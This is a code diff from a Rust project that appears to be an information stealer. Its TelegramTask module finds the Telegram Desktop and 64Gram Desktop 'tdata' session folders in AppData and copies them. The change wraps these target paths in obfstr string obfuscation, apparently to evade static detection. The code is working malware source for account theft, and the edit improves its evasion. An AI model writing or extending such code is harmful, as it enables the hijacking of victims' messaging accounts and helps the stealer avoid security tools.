@@ -2,6 +2,7 @@ use alloc::borrow::ToOwned;
 use alloc::vec;
 use tasks::Task;
 use utils::path::Path;
+use obfstr::obfstr as s;
 
 pub(super) struct TelegramTask;
 
@@ -9,8 +10,8 @@ impl Task for TelegramTask {
     unsafe fn run(&self, parent: &Path) {
         let appdata = &Path::appdata();
         let paths = [
-            ("Telegram Desktop", appdata / "Telegram Desktop" / "tdata"),
-            ("64Gram Desktop", appdata / "64Gram Desktop" / "tdata"),
+            ("Telegram Desktop", appdata / s!("Telegram Desktop") / s!("tdata")),
+            ("64Gram Desktop", appdata / s!("64Gram Desktop") / s!("tdata")),
         ];
         
         for (client, tdata_path) in paths {
@@ -23,7 +24,7 @@ impl Task for TelegramTask {
 }
 
 fn copy_tdata(tdata: &Path, dst: &Path) {
-    if !(tdata / "key_datas").is_exists() {
+    if !(tdata / s!("key_datas")).is_exists() {
         return
     }
     
